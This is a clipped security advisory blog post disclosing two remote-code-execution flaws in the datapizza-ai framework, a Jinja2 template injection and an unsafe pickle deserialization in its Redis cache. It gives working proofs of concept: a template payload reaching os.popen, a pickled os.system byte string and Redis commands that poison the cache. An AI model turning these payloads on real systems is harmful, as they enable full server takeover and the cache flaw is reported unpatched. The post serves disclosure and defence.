---
title: datapizza-ai, Yet Another Vulnerable AI Framework
source: https://www.hacktivesecurity.com/blog/2026/02/25/datapizza-ai-yet-another-vulnerable-ai-framework/
source_host: www.hacktivesecurity.com
clip_date: 2026-10-05T10:14:15+08:00
trace_id: d792d6cf-88d7-47f7-ba8e-a65f1fd6a9c3
content_hash: 83354fdb11c82452e02434914e2062c4f7cc89dfa0c21047a8fe04bdc7b7d0aa
status: synced
tags:
  - 漏洞分析
  - AI应用
series: null
feed_source: Hacktive Security·漏洞研究
ai_summary: datapizza-ai 存在两个可导致远程命令执行的漏洞：Jinja2 模板注入（已修复）与 Redis 缓存 pickle 反序列化（截至发文仍未修复）。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 3f075244-d011-813d-87ee-dd9610107af2
ioc:
  cves:
    - CVE-2026-2969
    - CVE-2026-2970
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> datapizza-ai 存在两个可导致远程命令执行的漏洞：Jinja2 模板注入（已修复）与 Redis 缓存 pickle 反序列化（截至发文仍未修复）。
> 
> - **CVE-2026-2969（SSTI→RCE，已修复）：** `ChatPromptTemplate` 直接用 `jinja2.Template()` 渲染用户可控的提示词模板，PoC 借助 `{{self.__init__.__globals__.__builtins__.__import__('os').popen('touch pwned1')}}` 在 host 上执行任意系统命令；厂商在 v0.0.3 静默修复，未发公告、未通知用户。
> - **CVE-2026-2970（反序列化→RCE，仍存在）：** `RedisCache.get()` 对缓存值直接调用 `pickle.loads()`，攻击者只要污染 Redis 键（`__reduce__` 返回 `os.system` 的 pickle 字节）即可在读取缓存时触发命令执行（如 `touch cachepwned`）。
> - **复现条件：** 安装 `datapizza-ai==0.0.2` / `0.0.7` 与 `datapizza-ai-cache-redis`，用 Docker 起 `redis:latest`（6379），运行 PoC 后生成 pwned1、pwned2、cachepwned 文件即可验证。
> - **影响面：** 两个漏洞均可让攻击者完全接管服务器（例如反弹 shell），任何把不可信输入交给 `ChatPromptTemplate` 或使用 `RedisCache` 的功能都潜在受影响。
> - **厂商响应：** 2025-10-14 报告 SSTI 后当天即被修复（commit 31cb152），10-16 报告反序列化漏洞后，邮件、Discord、GitHub 私密安全公告均未获任何回复，无公开 advisory 或用户通知。

## TL;DR

Two Remote Code Execution (RCE) vulnerabilities were identified in datapizza-ai framework:

-   **SSTI leading to RCE (CVE-2026-2969, fixed)**: Unsafe usage of Jinja2’s `Template()` allows Server-Side Template Injection (SSTI). If an attacker can control prompt templates, they can execute arbitrary system commands on the host.
-   **Unsafe Deserialization leading to RCE (CVE-2026-2970, still present)**: The Redis cache implementation uses `pickle.loads()` on untrusted data. By poisoning the cache, an attacker can trigger arbitrary command execution when cached objects are deserialized.

## What is datapizza-ai

Source here [https://github.com/datapizza-labs/datapizza-ai](https://github.com/datapizza-labs/datapizza-ai).

## CVE-2026-2969

The vulnerability is caused by the usage of vulnerable functions of Jinja2 template engine (*datapizza-ai-core/datapizza/modules/prompt/prompt.py*, source here [https://github.com/datapizza-labs/datapizza-ai/blob/v0.0.2/datapizza-ai-core/datapizza/modules/prompt/prompt.py](https://github.com/datapizza-labs/datapizza-ai/blob/v0.0.2/datapizza-ai-core/datapizza/modules/prompt/prompt.py)).

```python
from jinja2 import Template
# ...
class ChatPromptTemplate(Prompt):
# ...
    def __init__(self, user_prompt_template, retrieval_prompt_template):
        self.user_prompt_template = Template(user_prompt_template)
        self.retrieval_prompt_template = Template(retrieval_prompt_template)
# ...
        # Add user's prompt
        formatted_user_prompt = self.user_prompt_template.render(
            user_prompt=user_prompt
        )
# ...
formatted_retrieval = self.retrieval_prompt_template.render(chunks=chunks)
# ...
```

To reproduce the exploit we have to install datapizza-ai:

```bash
python -m venv .env
source .env/bin/activate
pip install datapizza-ai==0.0.2
```

Create a python file with the following content:

```python
import uuid

from datapizza.modules.prompt import ChatPromptTemplate
from datapizza.type import Chunk

# Create structured prompts for different tasks
system_prompt = ChatPromptTemplate(
    user_prompt_template="You are helping with data analysis tasks, this is the user prompt: " \
    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('touch pwned1')}}",
    retrieval_prompt_template="Retrieved " \
    "{{self.__init__.__globals__.__builtins__.__import__('os').popen('touch pwned2')}} " \
    "content:\n{% for chunk in chunks %}{{ chunk.text }}\n{% endfor %}"
)

print(
    system_prompt.format(
        user_prompt="Hello, how are you?", 
        chunks=[
            Chunk(id=str(uuid.uuid4()), text="This is a chunk"),
        Chunk(id=str(uuid.uuid4()), text="This is another chunk")
        ]
    )
)
```

Execute the file with `python3 poc.py`.

Command injection result (`ls -alh`):

```
total 28K
drwxrwxr-x  3 edoardottt edoardottt 4.0K Oct 14 12:31 .
drwxrwxr-x 13 edoardottt edoardottt 4.0K Oct 14 11:51 ..
-rw-rw-r--  1 edoardottt edoardottt  808 Oct 14 12:31 poc3-working.py
-rw-rw-r--  1 edoardottt edoardottt    0 Oct 14 12:30 pwned1
-rw-rw-r--  1 edoardottt edoardottt    0 Oct 14 12:30 pwned2
drwxrwxr-x  5 edoardottt edoardottt 4.0K Oct 14 11:53 .venv
```

Usually if attackers can control the prompt templates they can subvert the model behavior.  
In this case, attackers can run arbitrary system command without any restriction (e.g. they could use a reverse shell and gain access to the server).  
*The impact is critical as the attacker can completely takeover the server host.*  
Here a simple Proof of Concept code snippet is shown, but in reality every feature that uses untrusted input in `ChatPromptTemplate` is vulnerable.

## CVE-2026-2970

The vulnerability is caused by the usage of vulnerable functions of pickle serialization library (*datapizza-ai-cache/redis/datapizza/cache/redis/cache.py*, source here [https://github.com/datapizza-labs/datapizza-ai/blob/v0.0.7/datapizza-ai-cache/redis/datapizza/cache/redis/cache.py](https://github.com/datapizza-labs/datapizza-ai/blob/v0.0.7/datapizza-ai-cache/redis/datapizza/cache/redis/cache.py)).

```python
import pickle
# ...
class RedisCache(Cache):
# ...
    def get(self, key: str) -> str | None:
        """Retrieve and deserialize object"""
        pickled_obj = self.redis.get(key)
        if pickled_obj is None:
            return None
        return pickle.loads(pickled_obj)  # type: ignore

    def set(self, key: str, obj):
        """Serialize and store object"""
        pickled_obj = pickle.dumps(obj)
        self.redis.set(key, pickled_obj, ex=self.expiration_time)
```

To reproduce the exploit we have to install datapizza-ai and the Redis cache module:

```bash
python -m venv .env
source .env/bin/activate
pip install datapizza-ai==0.0.7
pip install datapizza-ai-cache-redis
```

Spin up a Redis server (we’re using Docker for simplicity):

```bash
docker run -d --name redis -p 6379:6379 redis:latest
```

For a simple proof of concept we’re using the bytes representation of pickled object below:

```ruby
class Evil:
    def __reduce__(self):
        return (os.system, ("touch cachepwned",))
```

that is: `\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x10touch cachepwned\x94\x85\x94R\x94.`.

Poison the Redis cache with this value:

```
127.0.0.1:6379> set poc "\x80\x04\x95+\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c\x10touch cachepwned\x94\x85\x94R\x94."
OK
```

And run the python program below with `python3 poc.py`.  
The following snippet just creates a new Redis cache object and tries to get the value of the key “poc” from Redis.

```css
from datapizza.cache.redis import RedisCache

def test_redis_cache():
    cache = RedisCache(host="localhost", port=6379, db=0)
    cache.get("poc")

test_redis_cache()
```

Command injection result (`ls -alh`):

```
total 16K
-rw-rw-r-- 1 edoardottt edoardottt    0 Oct 15 18:57 cachepwned
-rw-rw-r-- 1 edoardottt edoardottt  312 Oct 15 18:51 poc-cache.py
drwxrwxr-x 5 edoardottt edoardottt 4.0K Oct 14 11:53 .venv/
```

Usually if attackers can control the redis cache they can subvert the model behavior, for example injecting fake LLM replies in cached queries.  
In this case, attackers can run arbitrary system commands without any restriction (e.g. they could use a reverse shell and gain access to the server).  
*The impact is high as the attacker can completely takeover the server host.*  
Here a simple Proof of Concept code snippet is shown, but in reality every feature that uses `RedisCache` is potentially vulnerable.

## Final Considerations

I want to share a couple of thoughts:

*First: how is it possible that in 2026 we still have these types of vulnerabilities?*  
Nowadays, any developer should know that for every language there are libraries that could lead to very bad vulnerabilities such as Jinja2 and Pickle.

*Second: It was a pain in the ass communicating with the vendor.*  
**Emails (from me and a CNA), Discord messages and GitHub private security advisories** have been used and still this was the process so far:

-   14 October 2025: Reported SSTI vulnerability details and PoC using GitHub private security advisory.
-   14 October 2025: They immediately fixed the SSTI in `datapizza-ai-core` v0.0.3 ([https://github.com/datapizza-labs/datapizza-ai/commit/31cb15234dd05e5d2f3d4a3499b050602fb1304a](https://github.com/datapizza-labs/datapizza-ai/commit/31cb15234dd05e5d2f3d4a3499b050602fb1304a)) without public advisory or user notification.
-   16 October 2025: Reported Unsafe Deserialization vulnerability details and PoC using GitHub private security advisory.

That’s it, no further communication. **We didn’t receive replies to our messages and no public advisory or user notification was issued in accordance with responsible disclosure practices**.

**The Unsafe Deserialization it’s still present, no response from the vendor** ([https://github.com/datapizza-labs/datapizza-ai/blob/f3c5508acce857f6a454ca239aea7481f97ceb69/datapizza-ai-cache/redis/datapizza/cache/redis/cache.py](https://github.com/datapizza-labs/datapizza-ai/blob/f3c5508acce857f6a454ca239aea7481f97ceb69/datapizza-ai-cache/redis/datapizza/cache/redis/cache.py)).

*How is it possible that in 2026 companies still fail to understand how basic security practices work and doesn’t care about their product (and users) security?*

At first I wanted to use a lot of memes here (Datapizza uses a lot), but honestly there’s nothing to laugh about .
![😕](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5dc1ca61bbc8cd4b.png)
